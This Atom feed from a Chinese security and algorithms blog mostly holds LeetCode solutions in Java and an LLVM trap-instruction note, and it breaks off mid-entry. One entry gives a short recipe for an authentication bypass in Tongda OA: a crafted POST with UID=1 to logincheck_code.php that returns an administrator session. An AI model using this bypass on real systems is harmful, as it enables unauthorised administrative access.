<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>信安Stduio</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.ydq6.com/"/>
  <updated>2020-07-03T04:41:38.883Z</updated>
  <id>http://blog.ydq6.com/</id>
  
  <author>
    <name>gwolfs</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Leetcode230-二叉搜索树中第K小的元素</title>
    <link href="http://blog.ydq6.com/uncategorized/Leetcode230-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%AC%ACK%E5%B0%8F%E7%9A%84%E5%85%83%E7%B4%A0/"/>
    <id>http://blog.ydq6.com/uncategorized/Leetcode230-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%AC%ACK%E5%B0%8F%E7%9A%84%E5%85%83%E7%B4%A0/</id>
    <published>2020-07-01T15:45:11.000Z</published>
    <updated>2020-07-03T04:41:38.883Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="230-二叉搜索树中第k小的元素"></span></h4><p>难度中等232</p><p>给定一个二叉搜索树，编写一个函数 <code>kthSmallest</code> 来查找其中第 <strong>k</strong> 个最小的元素。</p><p><strong>说明：</strong><br>你可以假设 k 总是有效的，1 ≤ k ≤ 二叉搜索树元素个数。</p><a id="more"></a><p>方法一。</p><p>中序遍历+DFS（递归）。</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Problem230</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> curK;</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">value</span> = <span class="number">-1</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">midVisit</span>(<span class="params">TreeNode root</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">value</span> != <span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        midVisit(root.left);</span><br><span class="line">        curK--;</span><br><span class="line">        <span class="keyword">if</span>(curK == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">value</span> = root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        midVisit(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span>(<span class="params">TreeNode root, <span class="keyword">int</span> k</span>)</span> &#123;</span><br><span class="line">        curK = k;</span><br><span class="line">        midVisit(root);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200701234539055.png" alt="image-20200701234539055"></p><p>方法二。将递归改为非递归，即迭代的形式(用linkedList代替栈实现中序遍历的左中右).</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        LinkedList&lt;TreeNode&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        TreeNode curNode = root;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(curNode!= <span class="keyword">null</span>)&#123;</span><br><span class="line">                linkedList.add(curNode);</span><br><span class="line">                curNode = curNode.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(linkedList.size() != <span class="number">0</span>)&#123;</span><br><span class="line">                curNode = linkedList.getLast();</span><br><span class="line">                linkedList.removeLast();</span><br><span class="line">                k--;</span><br><span class="line">                <span class="keyword">if</span>(k == <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> curNode.val;</span><br><span class="line">                &#125;</span><br><span class="line">                curNode = curNode.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200703124121452.png" alt="image-20200703124121452"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;230-二叉搜索树中第K小的元素&quot;&gt;&lt;a href=&quot;#230-二叉搜索树中第K小的元素&quot; class=&quot;headerlink&quot; title=&quot;230. 二叉搜索树中第K小的元素&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/kth-smallest-element-in-a-bst/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;230. 二叉搜索树中第K小的元素&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;难度中等232&lt;/p&gt;
&lt;p&gt;给定一个二叉搜索树，编写一个函数 &lt;code&gt;kthSmallest&lt;/code&gt; 来查找其中第 &lt;strong&gt;k&lt;/strong&gt; 个最小的元素。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;br&gt;你可以假设 k 总是有效的，1 ≤ k ≤ 二叉搜索树元素个数。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Leetcode718-最长重复子数组</title>
    <link href="http://blog.ydq6.com/uncategorized/Leetcode718-%E6%9C%80%E9%95%BF%E9%87%8D%E5%A4%8D%E5%AD%90%E6%95%B0%E7%BB%84/"/>
    <id>http://blog.ydq6.com/uncategorized/Leetcode718-%E6%9C%80%E9%95%BF%E9%87%8D%E5%A4%8D%E5%AD%90%E6%95%B0%E7%BB%84/</id>
    <published>2020-07-01T09:57:11.000Z</published>
    <updated>2020-07-01T15:29:53.803Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="718-最长重复子数组"></span></h4><p>难度中等235</p><p>给两个整数数组 <code>A</code> 和 <code>B</code> ，返回两个数组中公共的、长度最长的子数组的长度。</p><p><strong>示例 1:</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入:</span><br><span class="line">A: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line">B: [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>]</span><br><span class="line">输出: <span class="number">3</span></span><br><span class="line">解释: </span><br><span class="line">长度最长的公共子数组是 [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]。</span><br></pre></td></tr></table></figure><p><strong>说明:</strong></p><ol><li>1 &lt;= len(A), len(B) &lt;= 1000</li><li>0 &lt;= A[i], B[i] &lt; 100</li></ol><a id="more"></a><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dp[<span class="string">i</span>][<span class="symbol">j</span>]      以A[i],B[j]结尾的最大公共子数组</span><br><span class="line"></span><br><span class="line">dp[<span class="string">i</span>][<span class="symbol">j</span>]=</span><br><span class="line">(1)dp[<span class="string">i-1</span>][<span class="symbol">j-1</span>]+1 if A[i]=B[j]</span><br><span class="line">(2)0</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findLength</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][] dp = <span class="keyword">new</span> <span class="keyword">int</span>[A.length][B.length];</span><br><span class="line">        <span class="keyword">int</span> maxLength = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i &lt; A.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i] == B[<span class="number">0</span>])&#123;</span><br><span class="line">                dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">                maxLength = <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">0</span>;j &lt; B.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[<span class="number">0</span>] == B[j])&#123;</span><br><span class="line">                dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">                maxLength = <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; A.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j &lt; B.length;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(A[i] == B[j])&#123;</span><br><span class="line">                    dp[i][j] = dp[i-<span class="number">1</span>][j-<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span>(dp[i][j] &gt; maxLength)&#123;</span><br><span class="line">                        maxLength = dp[i][j];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLength;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200701232935295.png" alt="image-20200701232935295"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;718-最长重复子数组&quot;&gt;&lt;a href=&quot;#718-最长重复子数组&quot; class=&quot;headerlink&quot; title=&quot;718. 最长重复子数组&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;718. 最长重复子数组&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;难度中等235&lt;/p&gt;
&lt;p&gt;给两个整数数组 &lt;code&gt;A&lt;/code&gt; 和 &lt;code&gt;B&lt;/code&gt; ，返回两个数组中公共的、长度最长的子数组的长度。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;示例 1:&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight angelscript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;输入:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;A: [&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;B: [&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;输出: &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;解释: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;长度最长的公共子数组是 [&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;说明:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;1 &amp;lt;= len(A), len(B) &amp;lt;= 1000&lt;/li&gt;
&lt;li&gt;0 &amp;lt;= A[i], B[i] &amp;lt; 100&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Leetcode39-组合总和</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode39-%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode39-%E7%BB%84%E5%90%88%E6%80%BB%E5%92%8C/</id>
    <published>2020-06-22T01:53:50.000Z</published>
    <updated>2020-06-22T14:16:33.306Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="39-组合总和"></span></h4><p>难度中等726</p><p>给定一个<strong>无重复元素</strong>的数组 <code>candidates</code> 和一个目标数 <code>target</code> ，找出 <code>candidates</code> 中所有可以使数字和为 <code>target</code> 的组合。</p><p><code>candidates</code> 中的数字可以无限制重复被选取。</p><p><strong>说明：</strong></p><ul><li>所有数字（包括 <code>target</code>）都是正整数。</li><li>解集不能包含重复的组合。 </li></ul><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;39-组合总和&quot;&gt;&lt;a href=&quot;#39-组合总和&quot; class=&quot;headerlink&quot; title=&quot;39. 组合总和&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/combination-sum/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;39. 组合总和&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;难度中等726&lt;/p&gt;
&lt;p&gt;给定一个&lt;strong&gt;无重复元素&lt;/strong&gt;的数组 &lt;code&gt;candidates&lt;/code&gt; 和一个目标数 &lt;code&gt;target&lt;/code&gt; ，找出 &lt;code&gt;candidates&lt;/code&gt; 中所有可以使数字和为 &lt;code&gt;target&lt;/code&gt; 的组合。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;candidates&lt;/code&gt; 中的数字可以无限制重复被选取。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;说明：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;所有数字（包括 &lt;code&gt;target&lt;/code&gt;）都是正整数。&lt;/li&gt;
&lt;li&gt;解集不能包含重复的组合。 &lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="数组" scheme="http://blog.ydq6.com/tags/%E6%95%B0%E7%BB%84/"/>
    
      <category term="回溯" scheme="http://blog.ydq6.com/tags/%E5%9B%9E%E6%BA%AF/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode72-编辑距离</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode72-%E7%BC%96%E8%BE%91%E8%B7%9D%E7%A6%BB/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode72-%E7%BC%96%E8%BE%91%E8%B7%9D%E7%A6%BB/</id>
    <published>2020-06-21T02:51:47.000Z</published>
    <updated>2020-06-21T10:13:12.155Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="72-编辑距离"></span></h4><p>难度困难928</p><p>给你两个单词 <em>word1</em> 和 <em>word2*，请你计算出将 *word1</em> 转换成 <em>word2</em> 所使用的最少操作数 。</p><p>你可以对一个单词进行如下三种操作：</p><ol><li>插入一个字符</li><li>删除一个字符</li><li>替换一个字符</li></ol><a id="more"></a><p>假设<code>dp[i][j]</code>为从word1[0:i]到word2[0:j]的编辑距离，左闭右开，特殊的，word1[0:0]、word2[0:0]为空，</p><p>则</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">对于替换，dp[<span class="string">i</span>][<span class="symbol">j</span>]=dp[<span class="string">i-1</span>][<span class="symbol">j-1</span>]+1 or dp[<span class="string">i-1</span>][<span class="symbol">j-1</span>]</span><br><span class="line">对于添加，dp[<span class="string">i</span>][<span class="symbol">j</span>]=dp[<span class="string">i-1</span>][<span class="symbol">j</span>]+1</span><br><span class="line">对于删除，dp[<span class="string">i</span>][<span class="symbol">j</span>]=dp[<span class="string">i</span>][<span class="symbol">j-1</span>]+1</span><br><span class="line"></span><br><span class="line">所以dp[<span class="string">i</span>][<span class="symbol">j</span>]=min(dp[<span class="string">i-1</span>][<span class="symbol">j-1</span>]+1,dp[<span class="string">i-1</span>][<span class="symbol">j</span>]+1,dp[<span class="string">i</span>][<span class="symbol">j-1</span>]+1);</span><br></pre></td></tr></table></figure><p>递推方程:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）dp[<span class="string">0</span>][<span class="symbol">0</span>]~dp[<span class="string">0</span>][<span class="symbol">len(word2)-1</span>]</span><br><span class="line">（2）dp[<span class="string">0</span>][<span class="symbol">0</span>]~dp[<span class="string">len(word)-1</span>][<span class="symbol">0</span>]</span><br><span class="line"> (3)外层1~i，内层1~j,计算dp[<span class="string">i</span>][<span class="symbol">j</span>]</span><br></pre></td></tr></table></figure><p>最短距离：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minDistance</span><span class="params">(String word1, String word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[][]dp = <span class="keyword">new</span> <span class="keyword">int</span>[word1.length()+<span class="number">1</span>][word2.length()+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j &lt;= word2.length();j++)&#123;</span><br><span class="line">            dp[<span class="number">0</span>][j] = dp[<span class="number">0</span>][j-<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= word1.length();i++)&#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = dp[i-<span class="number">1</span>][<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= word1.length();i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>;j &lt;= word2.length();j++)&#123;</span><br><span class="line">                dp[i][j] = Math.min(dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j])+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(word1.charAt(i-<span class="number">1</span>) == word2.charAt(j-<span class="number">1</span>))&#123;</span><br><span class="line">                    dp[i][j] = Math.min(dp[i][j],dp[i-<span class="number">1</span>][j-<span class="number">1</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    dp[i][j] = Math.min(dp[i][j],dp[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[word1.length()][word2.length()];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200621180754034.png" alt="image-20200621180754034"></p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;72-编辑距离&quot;&gt;&lt;a href=&quot;#72-编辑距离&quot; class=&quot;headerlink&quot; title=&quot;72. 编辑距离&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems/edit-distance/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;72. 编辑距离&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;难度困难928&lt;/p&gt;
&lt;p&gt;给你两个单词 &lt;em&gt;word1&lt;/em&gt; 和 &lt;em&gt;word2*，请你计算出将 *word1&lt;/em&gt; 转换成 &lt;em&gt;word2&lt;/em&gt; 所使用的最少操作数 。&lt;/p&gt;
&lt;p&gt;你可以对一个单词进行如下三种操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;插入一个字符&lt;/li&gt;
&lt;li&gt;删除一个字符&lt;/li&gt;
&lt;li&gt;替换一个字符&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://blog.ydq6.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="数组" scheme="http://blog.ydq6.com/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>LLVM-bug</title>
    <link href="http://blog.ydq6.com/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM-bug/"/>
    <id>http://blog.ydq6.com/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/LLVM-bug/</id>
    <published>2020-06-20T14:48:26.000Z</published>
    <updated>2020-06-20T16:08:54.592Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="llvmtrap">llvm.trap</span></h2><p>今天在做项目时发现一个问题。用clang生成的.bc文件可能会生成一些陷阱指令。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">call</span> void <span class="title">@llvm.trap</span>()</span><br><span class="line"><span class="keyword">unreachable</span></span><br></pre></td></tr></table></figure><p>所以在改写代码时要注意，不要在陷阱指令后加hook或其他指令，不然永远达不到而且会报错。</p><p>[注] 作者使用版本为llvm7.0</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;llvmtrap&quot;&gt;llvm.trap&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;今天在做项目时发现一个问题。用clang生成的.bc文件可能会生成一些陷阱指令。&lt;/p&gt;
&lt;figure class=&quot;highlight llvm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c
      
    
    </summary>
    
    
      <category term="程序分析" scheme="http://blog.ydq6.com/categories/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="LLVM" scheme="http://blog.ydq6.com/tags/LLVM/"/>
    
  </entry>
  
  <entry>
    <title>通达OA漏洞</title>
    <link href="http://blog.ydq6.com/uncategorized/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.ydq6.com/uncategorized/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-06-20T03:17:08.000Z</published>
    <updated>2020-06-20T05:34:09.672Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="任意用户登录漏洞">任意用户登录漏洞</span></h3><p>在logincheck_code.php中删除cookie并在post请求中加入UID=1，然后响应返回系统管理员session值。</p><p>演示：<br><img src="/assets/image-20200620113426425.png" alt="image-20200620113426425"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;任意用户登录漏洞&quot;&gt;任意用户登录漏洞&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;在logincheck_code.php中删除cookie并在post请求中加入UID=1，然后响应返回系统管理员session值。&lt;/p&gt;
&lt;p&gt;演示：&lt;br&gt;&lt;img src=&quot;/a
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Leetcode102-二叉树层次遍历</title>
    <link href="http://blog.ydq6.com/program/Leetcode102-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86/"/>
    <id>http://blog.ydq6.com/program/Leetcode102-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%B1%82%E6%AC%A1%E9%81%8D%E5%8E%86/</id>
    <published>2020-06-19T11:44:36.000Z</published>
    <updated>2020-06-19T11:47:02.014Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="102-二叉树的层序遍历"></span></h4><p>难度中等536</p><p>给你一个二叉树，请你返回其按 <strong>层序遍历</strong> 得到的节点值。 （即逐层地，从左到右访问所有节点）。</p><p><strong>示例：</strong><br>二叉树：<code>[3,9,20,null,null,15,7]</code>,</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3</span></span><br><span class="line"> / \</span><br><span class="line"><span class="number">9</span>  <span class="number">20</span></span><br><span class="line">  /  \</span><br><span class="line"> <span class="number">15</span>   <span class="number">7</span></span><br></pre></td></tr></table></figure><p>返回其层次遍历结果：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [<span class="number">3</span>],</span><br><span class="line">  [<span class="number">9</span>,<span class="number">20</span>],</span><br><span class="line">  [<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><a id="more"></a><p>这道题思想就是利用bfs队列+单独map表示节点层次</p><p>java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 